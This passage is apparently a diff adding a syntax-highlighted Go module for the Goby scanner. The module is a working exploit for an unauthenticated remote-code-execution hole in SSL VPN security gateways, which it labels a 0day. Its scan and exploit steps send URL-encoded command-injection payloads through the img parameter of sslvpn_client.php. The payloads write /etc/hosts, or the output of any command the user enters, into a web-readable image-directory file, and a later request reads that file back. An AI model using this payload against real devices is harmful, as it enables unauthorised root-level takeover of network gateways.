+</span><span class="lnt">206
+</span><span class="lnt">207
+</span><span class="lnt">208
+</span><span class="lnt">209
+</span><span class="lnt">210
+</span><span class="lnt">211
+</span><span class="lnt">212
+</span><span class="lnt">213
+</span><span class="lnt">214
+</span><span class="lnt">215
+</span><span class="lnt">216
+</span><span class="lnt">217
+</span><span class="lnt">218
+</span><span class="lnt">219
+</span><span class="lnt">220
+</span><span class="lnt">221
+</span><span class="lnt">222
+</span><span class="lnt">223
+</span><span class="lnt">224
+</span><span class="lnt">225
+</span><span class="lnt">226
+</span><span class="lnt">227
+</span><span class="lnt">228
+</span><span class="lnt">229
+</span><span class="lnt">230
+</span><span class="lnt">231
+</span><span class="lnt">232
+</span><span class="lnt">233
+</span><span class="lnt">234
+</span><span class="lnt">235
+</span><span class="lnt">236
+</span><span class="lnt">237
+</span><span class="lnt">238
+</span><span class="lnt">239
+</span><span class="lnt">240
+</span><span class="lnt">241
+</span><span class="lnt">242
+</span><span class="lnt">243
+</span><span class="lnt">244
+</span><span class="lnt">245
+</span><span class="lnt">246
+</span><span class="lnt">247
+</span><span class="lnt">248
+</span><span class="lnt">249
+</span><span class="lnt">250
+</span><span class="lnt">251
+</span><span class="lnt">252
+</span><span class="lnt">253
+</span><span class="lnt">254
+</span><span class="lnt">255
+</span><span class="lnt">256
+</span><span class="lnt">257
+</span><span class="lnt">258
+</span><span class="lnt">259
+</span><span class="lnt">260
+</span><span class="lnt">261
+</span><span class="lnt">262
+</span><span class="lnt">263
+</span><span class="lnt">264
+</span><span class="lnt">265
+</span><span class="lnt">266
+</span><span class="lnt">267
+</span><span class="lnt">268
+</span><span class="lnt">269
+</span><span class="lnt">270
+</span><span class="lnt">271
+</span><span class="lnt">272
+</span><span class="lnt">273
+</span><span class="lnt">274
+</span><span class="lnt">275
+</span><span class="lnt">276
+</span><span class="lnt">277
+</span><span class="lnt">278
+</span><span class="lnt">279
+</span><span class="lnt">280
+</span><span class="lnt">281
+</span><span class="lnt">282
+</span><span class="lnt">283
+</span><span class="lnt">284
+</span><span class="lnt">285
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="line"><span class="cl"><span class="kn">package</span> <span class="nx">exploits</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">(</span>
+</span></span><span class="line"><span class="cl">	<span class="s">&#34;git.gobies.org/goby/goscanner/goutils&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">func</span> <span class="nf">init</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">expJson</span> <span class="o">:=</span> <span class="s">`{
+</span></span></span><span class="line"><span class="cl"><span class="s">    &#34;Name&#34;: &#34;Multiple Security Gateway Frontend RCE&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">    &#34;Description&#34;: &#34;A 0day RCE in multiple security gateway&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">    &#34;Product&#34;: &#34;Multiple Security Gateway&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">    &#34;Homepage&#34;: &#34;https://gobies.org/&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">    &#34;DisclosureDate&#34;: &#34;2021-05-30&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">    &#34;Author&#34;: &#34;gobysec@gmail.com&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">    &#34;GobyQuery&#34;: &#34;header=\&#34;Set-Cookie: USGSESSID\&#34;&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">    &#34;Level&#34;: &#34;3&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">    &#34;Impact&#34;: &#34;&lt;p&gt;The attackers are allowed to execute any code with root privilege without any login crenditials.&lt;/p&gt;&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">    &#34;Recommendation&#34;: &#34;&lt;p&gt;1. For security devices, it&#39;s not recommended to make them accessable from Internet.&lt;/p&gt;&lt;p&gt;2. You should contact the product suppliance for help.&lt;/p&gt;&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">    &#34;References&#34;: [
+</span></span></span><span class="line"><span class="cl"><span class="s">        &#34;https://gobies.org/&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s">    ],
+</span></span></span><span class="line"><span class="cl"><span class="s">    &#34;HasExp&#34;: true,
+</span></span></span><span class="line"><span class="cl"><span class="s">    &#34;ExpParams&#34;: [
+</span></span></span><span class="line"><span class="cl"><span class="s">        {
+</span></span></span><span class="line"><span class="cl"><span class="s">            &#34;name&#34;: &#34;cmd&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">            &#34;type&#34;: &#34;input&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">            &#34;value&#34;: &#34;cat /etc/hosts &#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">            &#34;show&#34;: &#34;Enter the command you want to execute&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s">        }
+</span></span></span><span class="line"><span class="cl"><span class="s">    ],
+</span></span></span><span class="line"><span class="cl"><span class="s">    &#34;ExpTips&#34;: {
+</span></span></span><span class="line"><span class="cl"><span class="s">        &#34;Type&#34;: &#34;&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">        &#34;Content&#34;: &#34;&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s">    },
+</span></span></span><span class="line"><span class="cl"><span class="s">    &#34;ScanSteps&#34;: [
+</span></span></span><span class="line"><span class="cl"><span class="s">        &#34;AND&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">        {
+</span></span></span><span class="line"><span class="cl"><span class="s">            &#34;Request&#34;: {
+</span></span></span><span class="line"><span class="cl"><span class="s">                &#34;method&#34;: &#34;GET&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                &#34;uri&#34;: &#34;/sslvpn/sslvpn_client.php&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                &#34;follow_redirect&#34;: true,
+</span></span></span><span class="line"><span class="cl"><span class="s">                &#34;header&#34;: {},
+</span></span></span><span class="line"><span class="cl"><span class="s">                &#34;data_type&#34;: &#34;text&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                &#34;data&#34;: &#34;&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s">            },
+</span></span></span><span class="line"><span class="cl"><span class="s">            &#34;ResponseTest&#34;: {
+</span></span></span><span class="line"><span class="cl"><span class="s">                &#34;type&#34;: &#34;group&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                &#34;operation&#34;: &#34;AND&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                &#34;checks&#34;: [
+</span></span></span><span class="line"><span class="cl"><span class="s">                    {
+</span></span></span><span class="line"><span class="cl"><span class="s">                        &#34;type&#34;: &#34;item&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                        &#34;variable&#34;: &#34;$code&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                        &#34;operation&#34;: &#34;==&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                        &#34;value&#34;: &#34;200&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                        &#34;bz&#34;: &#34;&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s">                    }
+</span></span></span><span class="line"><span class="cl"><span class="s">                ]
+</span></span></span><span class="line"><span class="cl"><span class="s">            },
+</span></span></span><span class="line"><span class="cl"><span class="s">            &#34;SetVariable&#34;: []
+</span></span></span><span class="line"><span class="cl"><span class="s">        },
+</span></span></span><span class="line"><span class="cl"><span class="s">        {
+</span></span></span><span class="line"><span class="cl"><span class="s">            &#34;Request&#34;: {
+</span></span></span><span class="line"><span class="cl"><span class="s">                &#34;method&#34;: &#34;GET&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                &#34;uri&#34;: &#34;/sslvpn/sslvpn_client.php?client=logoImg&amp;img=%36%64%72%63%64%66%73%33%34%63%31%68%20%2f%74%6d%70%20%7c%7c%20%63%70%20%2f%65%74%63%2f%68%6f%73%74%73%20%2f%75%73%72%2f%6c%6f%63%61%6c%2f%77%65%62%75%69%2f%77%65%62%75%69%2f%69%6d%61%67%65%73%2f%62%61%73%69%63%2f%6c%6f%67%69%6e%2f%6d%61%69%6e%5f%6c%6f%67%6f%32%31%2e%74%78%74%20%7c%7c%20%6c%73&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                &#34;follow_redirect&#34;: true,
+</span></span></span><span class="line"><span class="cl"><span class="s">                &#34;header&#34;: {
+</span></span></span><span class="line"><span class="cl"><span class="s">                    &#34;Connection&#34;: &#34;close&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                    &#34;Upgrade-Insecure-Requests&#34;: &#34;1&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                    &#34;User-Agent&#34;: &#34;Mozilla/5.0&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                    &#34;Accept&#34;: &#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                    &#34;Sec-Fetch-Site&#34;: &#34;same-origin&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                    &#34;Sec-Fetch-Mode&#34;: &#34;navigate&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                    &#34;Sec-Fetch-User&#34;: &#34;?1&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                    &#34;Sec-Fetch-Dest&#34;: &#34;iframe&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                    &#34;Referer&#34;: &#34;</span><span class="cp">{{</span><span class="err">{</span><span class="nx">hostinfo</span><span class="cp">}}</span><span class="s">}&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                    &#34;Accept-Encoding&#34;: &#34;gzip, deflate&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                    &#34;Accept-Language&#34;: &#34;zh-CN,zh;q=0.9&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                    &#34;Content-Type&#34;: &#34;application/x-www-form-urlencoded&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s">                },
+</span></span></span><span class="line"><span class="cl"><span class="s">                &#34;data_type&#34;: &#34;text&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                &#34;data&#34;: &#34;&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s">            },
+</span></span></span><span class="line"><span class="cl"><span class="s">            &#34;ResponseTest&#34;: {
+</span></span></span><span class="line"><span class="cl"><span class="s">                &#34;type&#34;: &#34;group&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                &#34;operation&#34;: &#34;AND&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                &#34;checks&#34;: [
+</span></span></span><span class="line"><span class="cl"><span class="s">                    {
+</span></span></span><span class="line"><span class="cl"><span class="s">                        &#34;type&#34;: &#34;item&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                        &#34;variable&#34;: &#34;$code&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                        &#34;operation&#34;: &#34;==&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                        &#34;value&#34;: &#34;200&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                        &#34;bz&#34;: &#34;&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s">                    },
+</span></span></span><span class="line"><span class="cl"><span class="s">                    {
+</span></span></span><span class="line"><span class="cl"><span class="s">                        &#34;type&#34;: &#34;item&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                        &#34;variable&#34;: &#34;$body&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                        &#34;operation&#34;: &#34;contains&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                        &#34;value&#34;: &#34;6drcdfs34c1h&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                        &#34;bz&#34;: &#34;random string&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s">                    }
+</span></span></span><span class="line"><span class="cl"><span class="s">                ]
+</span></span></span><span class="line"><span class="cl"><span class="s">            },
+</span></span></span><span class="line"><span class="cl"><span class="s">            &#34;SetVariable&#34;: []
+</span></span></span><span class="line"><span class="cl"><span class="s">        },
+</span></span></span><span class="line"><span class="cl"><span class="s">        {
+</span></span></span><span class="line"><span class="cl"><span class="s">            &#34;Request&#34;: {
+</span></span></span><span class="line"><span class="cl"><span class="s">                &#34;method&#34;: &#34;GET&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                &#34;uri&#34;: &#34;/webui/images/basic/login/main_logo21.txt&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                &#34;follow_redirect&#34;: true,
+</span></span></span><span class="line"><span class="cl"><span class="s">                &#34;header&#34;: {
+</span></span></span><span class="line"><span class="cl"><span class="s">                    &#34;Connection&#34;: &#34;close&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                    &#34;Upgrade-Insecure-Requests&#34;: &#34;1&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                    &#34;User-Agent&#34;: &#34;Mozilla/5.0&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                    &#34;Accept&#34;: &#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                    &#34;Sec-Fetch-Site&#34;: &#34;same-origin&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                    &#34;Sec-Fetch-Mode&#34;: &#34;navigate&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                    &#34;Sec-Fetch-User&#34;: &#34;?1&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                    &#34;Sec-Fetch-Dest&#34;: &#34;iframe&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                    &#34;Referer&#34;: &#34;</span><span class="cp">{{</span><span class="err">{</span><span class="nx">hostinfo</span><span class="cp">}}</span><span class="s">}&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                    &#34;Accept-Encoding&#34;: &#34;gzip, deflate&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                    &#34;Accept-Language&#34;: &#34;zh-CN,zh;q=0.9&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                    &#34;Content-Type&#34;: &#34;application/x-www-form-urlencoded&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s">                },
+</span></span></span><span class="line"><span class="cl"><span class="s">                &#34;data_type&#34;: &#34;text&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                &#34;data&#34;: &#34;&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s">            },
+</span></span></span><span class="line"><span class="cl"><span class="s">            &#34;ResponseTest&#34;: {
+</span></span></span><span class="line"><span class="cl"><span class="s">                &#34;type&#34;: &#34;group&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                &#34;operation&#34;: &#34;AND&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                &#34;checks&#34;: [
+</span></span></span><span class="line"><span class="cl"><span class="s">                    {
+</span></span></span><span class="line"><span class="cl"><span class="s">                        &#34;type&#34;: &#34;item&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                        &#34;variable&#34;: &#34;$code&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                        &#34;operation&#34;: &#34;==&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                        &#34;value&#34;: &#34;200&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                        &#34;bz&#34;: &#34;&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s">                    },
+</span></span></span><span class="line"><span class="cl"><span class="s">                    {
+</span></span></span><span class="line"><span class="cl"><span class="s">                        &#34;type&#34;: &#34;item&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                        &#34;variable&#34;: &#34;$body&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                        &#34;operation&#34;: &#34;contains&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                        &#34;value&#34;: &#34;localhost&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                        &#34;bz&#34;: &#34;&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s">                    }
+</span></span></span><span class="line"><span class="cl"><span class="s">                ]
+</span></span></span><span class="line"><span class="cl"><span class="s">            },
+</span></span></span><span class="line"><span class="cl"><span class="s">            &#34;SetVariable&#34;: []
+</span></span></span><span class="line"><span class="cl"><span class="s">        }
+</span></span></span><span class="line"><span class="cl"><span class="s">    ],
+</span></span></span><span class="line"><span class="cl"><span class="s">    &#34;ExploitSteps&#34;: [
+</span></span></span><span class="line"><span class="cl"><span class="s">        &#34;AND&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">        {
+</span></span></span><span class="line"><span class="cl"><span class="s">            &#34;Request&#34;: {
+</span></span></span><span class="line"><span class="cl"><span class="s">                &#34;method&#34;: &#34;GET&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                &#34;uri&#34;: &#34;/sslvpn/sslvpn_client.php&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                &#34;follow_redirect&#34;: true,
+</span></span></span><span class="line"><span class="cl"><span class="s">                &#34;header&#34;: {},
+</span></span></span><span class="line"><span class="cl"><span class="s">                &#34;data_type&#34;: &#34;text&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                &#34;data&#34;: &#34;&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s">            },
+</span></span></span><span class="line"><span class="cl"><span class="s">            &#34;ResponseTest&#34;: {
+</span></span></span><span class="line"><span class="cl"><span class="s">                &#34;type&#34;: &#34;group&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                &#34;operation&#34;: &#34;AND&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                &#34;checks&#34;: [
+</span></span></span><span class="line"><span class="cl"><span class="s">                    {
+</span></span></span><span class="line"><span class="cl"><span class="s">                        &#34;type&#34;: &#34;item&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                        &#34;variable&#34;: &#34;$code&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                        &#34;operation&#34;: &#34;==&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                        &#34;value&#34;: &#34;200&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                        &#34;bz&#34;: &#34;&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s">                    }
+</span></span></span><span class="line"><span class="cl"><span class="s">                ]
+</span></span></span><span class="line"><span class="cl"><span class="s">            },
+</span></span></span><span class="line"><span class="cl"><span class="s">            &#34;SetVariable&#34;: []
+</span></span></span><span class="line"><span class="cl"><span class="s">        },
+</span></span></span><span class="line"><span class="cl"><span class="s">        {
+</span></span></span><span class="line"><span class="cl"><span class="s">            &#34;Request&#34;: {
+</span></span></span><span class="line"><span class="cl"><span class="s">                &#34;method&#34;: &#34;GET&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                &#34;set_variable&#34;: [
+</span></span></span><span class="line"><span class="cl"><span class="s">                    &#34;cmdUrlEncoded|cmd|url_encode|</span><span class="cp">{{</span><span class="err">{</span><span class="nx">cmd</span><span class="cp">}}</span><span class="s">}&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s">                ],
+</span></span></span><span class="line"><span class="cl"><span class="s">                &#34;uri&#34;: &#34;/sslvpn/sslvpn_client.php?client=logoImg&amp;img=%36%64%72%63%64%66%73%33%34%63%31%68%20%2f%74%6d%70%20%7c%7c%20%20</span><span class="cp">{{</span><span class="err">{</span><span class="nx">cmdUrlEncoded</span><span class="cp">}}</span><span class="s">}%20%7c%20%74%65%65%20%2f%65%74%63%2f%68%6f%73%74%73%20%2f%75%73%72%2f%6c%6f%63%61%6c%2f%77%65%62%75%69%2f%77%65%62%75%69%2f%69%6d%61%67%65%73%2f%62%61%73%69%63%2f%6c%6f%67%69%6e%2f%6d%61%69%6e%5f%6c%6f%67%6f%32%31%2e%74%78%74%20%7c%7c%20%6c%73&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                &#34;follow_redirect&#34;: true,
+</span></span></span><span class="line"><span class="cl"><span class="s">                &#34;header&#34;: {
+</span></span></span><span class="line"><span class="cl"><span class="s">                    &#34;Connection&#34;: &#34;close&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                    &#34;Upgrade-Insecure-Requests&#34;: &#34;1&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                    &#34;User-Agent&#34;: &#34;Mozilla/5.0&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                    &#34;Accept&#34;: &#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                    &#34;Sec-Fetch-Site&#34;: &#34;same-origin&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                    &#34;Sec-Fetch-Mode&#34;: &#34;navigate&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                    &#34;Sec-Fetch-User&#34;: &#34;?1&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                    &#34;Sec-Fetch-Dest&#34;: &#34;iframe&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                    &#34;Referer&#34;: &#34;</span><span class="cp">{{</span><span class="err">{</span><span class="nx">hostinfo</span><span class="cp">}}</span><span class="s">}&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                    &#34;Accept-Encoding&#34;: &#34;gzip, deflate&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                    &#34;Accept-Language&#34;: &#34;zh-CN,zh;q=0.9&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                    &#34;Content-Type&#34;: &#34;application/x-www-form-urlencoded&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s">                },
+</span></span></span><span class="line"><span class="cl"><span class="s">                &#34;data_type&#34;: &#34;text&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                &#34;data&#34;: &#34;&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s">            },
+</span></span></span><span class="line"><span class="cl"><span class="s">            &#34;ResponseTest&#34;: {
+</span></span></span><span class="line"><span class="cl"><span class="s">                &#34;type&#34;: &#34;group&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                &#34;operation&#34;: &#34;AND&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                &#34;checks&#34;: [
+</span></span></span><span class="line"><span class="cl"><span class="s">                    {
+</span></span></span><span class="line"><span class="cl"><span class="s">                        &#34;type&#34;: &#34;item&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                        &#34;variable&#34;: &#34;$code&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                        &#34;operation&#34;: &#34;==&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                        &#34;value&#34;: &#34;200&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                        &#34;bz&#34;: &#34;&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s">                    },
+</span></span></span><span class="line"><span class="cl"><span class="s">                    {
+</span></span></span><span class="line"><span class="cl"><span class="s">                        &#34;type&#34;: &#34;item&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                        &#34;variable&#34;: &#34;$body&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                        &#34;operation&#34;: &#34;contains&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                        &#34;value&#34;: &#34;6drcdfs34c1h&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                        &#34;bz&#34;: &#34;random string&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s">                    }
+</span></span></span><span class="line"><span class="cl"><span class="s">                ]
+</span></span></span><span class="line"><span class="cl"><span class="s">            },
+</span></span></span><span class="line"><span class="cl"><span class="s">            &#34;SetVariable&#34;: []
+</span></span></span><span class="line"><span class="cl"><span class="s">        },
+</span></span></span><span class="line"><span class="cl"><span class="s">        {
+</span></span></span><span class="line"><span class="cl"><span class="s">            &#34;Request&#34;: {
+</span></span></span><span class="line"><span class="cl"><span class="s">                &#34;method&#34;: &#34;GET&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                &#34;uri&#34;: &#34;/webui/images/basic/login/main_logo21.txt&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                &#34;follow_redirect&#34;: true,
+</span></span></span><span class="line"><span class="cl"><span class="s">                &#34;header&#34;: {
+</span></span></span><span class="line"><span class="cl"><span class="s">                    &#34;Connection&#34;: &#34;close&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                    &#34;Upgrade-Insecure-Requests&#34;: &#34;1&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                    &#34;User-Agent&#34;: &#34;Mozilla/5.0&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                    &#34;Accept&#34;: &#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                    &#34;Sec-Fetch-Site&#34;: &#34;same-origin&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                    &#34;Sec-Fetch-Mode&#34;: &#34;navigate&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                    &#34;Sec-Fetch-User&#34;: &#34;?1&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                    &#34;Sec-Fetch-Dest&#34;: &#34;iframe&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                    &#34;Referer&#34;: &#34;</span><span class="cp">{{</span><span class="err">{</span><span class="nx">hostinfo</span><span class="cp">}}</span><span class="s">}&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                    &#34;Accept-Encoding&#34;: &#34;gzip, deflate&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                    &#34;Accept-Language&#34;: &#34;zh-CN,zh;q=0.9&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                    &#34;Content-Type&#34;: &#34;application/x-www-form-urlencoded&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s">                },
+</span></span></span><span class="line"><span class="cl"><span class="s">                &#34;data_type&#34;: &#34;text&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                &#34;data&#34;: &#34;&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s">            },
+</span></span></span><span class="line"><span class="cl"><span class="s">            &#34;ResponseTest&#34;: {
+</span></span></span><span class="line"><span class="cl"><span class="s">                &#34;type&#34;: &#34;group&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                &#34;operation&#34;: &#34;AND&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                &#34;checks&#34;: [
+</span></span></span><span class="line"><span class="cl"><span class="s">                    {
+</span></span></span><span class="line"><span class="cl"><span class="s">                        &#34;type&#34;: &#34;item&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                        &#34;variable&#34;: &#34;$code&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                        &#34;operation&#34;: &#34;==&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                        &#34;value&#34;: &#34;200&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">                        &#34;bz&#34;: &#34;&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s">                    }
+</span></span></span><span class="line"><span class="cl"><span class="s">                ]
+</span></span></span><span class="line"><span class="cl"><span class="s">            },
+</span></span></span><span class="line"><span class="cl"><span class="s">            &#34;SetVariable&#34;: [
+</span></span></span><span class="line"><span class="cl"><span class="s">                &#34;output|lastbody&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s">            ]
+</span></span></span><span class="line"><span class="cl"><span class="s">        }
+</span></span></span><span class="line"><span class="cl"><span class="s">    ],
+</span></span></span><span class="line"><span class="cl"><span class="s">    &#34;Tags&#34;: [
+</span></span></span><span class="line"><span class="cl"><span class="s">        &#34;RCE&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">        &#34;0day&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s">    ],
+</span></span></span><span class="line"><span class="cl"><span class="s">    &#34;CVEIDs&#34;: null,
+</span></span></span><span class="line"><span class="cl"><span class="s">    &#34;CVSSScore&#34;: &#34;0.0&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s">    &#34;AttackSurfaces&#34;: {
+</span></span></span><span class="line"><span class="cl"><span class="s">        &#34;Application&#34;: null,
+</span></span></span><span class="line"><span class="cl"><span class="s">        &#34;Support&#34;: null,
+</span></span></span><span class="line"><span class="cl"><span class="s">        &#34;Service&#34;: null,
+</span></span></span><span class="line"><span class="cl"><span class="s">        &#34;System&#34;: null,
+</span></span></span><span class="line"><span class="cl"><span class="s">        &#34;Hardware&#34;: null
+</span></span></span><span class="line"><span class="cl"><span class="s">    },
+</span></span></span><span class="line"><span class="cl"><span class="s">    &#34;PocId&#34;: &#34;6807&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s">}`</span>
+</span></span><span class="line"><span class="cl">
